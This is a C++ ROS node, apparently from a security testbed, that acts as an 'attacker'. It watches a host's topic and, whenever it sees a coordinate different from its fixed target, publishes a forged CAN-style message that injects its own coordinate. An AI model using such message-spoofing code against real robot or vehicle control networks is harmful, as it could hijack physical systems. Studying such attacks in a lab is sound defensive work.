#include "ros/ros.h"
#include <std_msgs/Int8MultiArray.h>
#include <sstream>
#include <unistd.h>
ros::Publisher chatter_pub;
int targetCoordinate;

void chatterCallback(const std_msgs::Int8MultiArray::ConstPtr& msg)
{
    int itCounter = 0;
    while(itCounter<5000){
        itCounter++;
    }
    if(msg->data[1] != targetCoordinate) {
        //sleep(3000);
        std_msgs::Int8MultiArray attackerMsg;
        attackerMsg.data.push_back(1); //CAN-messagetype
        attackerMsg.data.push_back(targetCoordinate);
        chatter_pub.publish(attackerMsg);
        ROS_WARN("attecker sended  coordinate: %d", attackerMsg.data[1]);
    }
}


int main(int argc, char **argv)
{

  ros::init(argc, argv, "attacker");


  ros::NodeHandle n;


  chatter_pub = n.advertise<std_msgs::Int8MultiArray>("from_hostA", 1000);
  ros::Subscriber sub = n.subscribe("/to_hostA", 1000, chatterCallback);

  ros::Rate loop_rate(10);
  targetCoordinate = 3;

  while (ros::ok())
  {
   
/*    attackerMsg.data.push_back(1); //CAN-messagetype
    attackerMsg.data.push_back(3);
    chatter_pub.publish(attackerMsg);
    ROS_WARN("attecker sended  coordinate: %d", attackerMsg.data[1]);
*/



    ros::spinOnce();

   // loop_rate.sleep();
  }


  return 0;
}